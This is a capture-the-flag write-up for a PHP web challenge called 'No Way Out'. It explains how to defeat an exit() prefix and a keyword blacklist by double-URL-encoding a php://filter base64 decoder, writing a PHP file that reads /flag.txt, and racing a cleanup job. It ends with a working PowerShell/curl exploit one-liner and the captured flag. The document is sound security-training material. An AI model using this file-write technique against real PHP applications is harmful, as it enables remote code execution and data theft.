# No Way Out

**Point: 100**

The janitor is fast, and the filter is lethal. You have 0.67 seconds to bypass the exit() trap before your existence is erased.

<http://chal.thjcc.org:8080/>

## Soulution

1. Read `src/index.php` and note it writes `<?php exit(); ?>` before attacker content, with a blacklist on `base64`, `rot13`, and `string.strip_tags`.
2. Bypass the blacklist by URL-encoding inside the filter name: use `convert.ba%73e64-decode` in `php://filter`, then send it double-encoded through the URL so `%73` survives blacklist checking but is decoded by the stream wrapper.
3. Write a short-lived PHP file with `file=php://filter/write=convert.ba%73e64-decode/resource=<random>.php` and `content=a` + `base64("<?php readfile('/flag.txt'); ?>")`.
4. The fixed prefix decodes into harmless bytes, while attacker payload decodes into executable PHP.
5. Race the janitor (`0.67s`) by requesting `<random>.php` immediately after POST.
6. Extracted flag: `THJCC{h4ppy_n3w_y34r_4nd_c0ngr47_u_byp4SS_th7_EXIT_n1ah4wg1n9198w4tqr8926g1n94e92gw65j1n89h21w921g9}`.

```bash
$u='http://chal.thjcc.org:8080';$f=('x'+(Get-Random -Maximum 99999999)+'.php');$j=Start-Job -ScriptBlock {param($u,$f) curl.exe -s -X POST "$u/?file=php://filter/write=convert.ba%2573e64-decode/resource=$f" --data "content=aPD9waHAgcmVhZGZpbGUoJy9mbGFnLnR4dCcpOyA/Pg==" > $null} -ArgumentList $u,$f;1..250|%{$r=curl.exe -s "$u/$f";if($r -match 'THJCC\{[^}]+\}'){$matches[0];break};Start-Sleep -Milliseconds 10};Wait-Job $j|Out-Null;Remove-Job $j
```
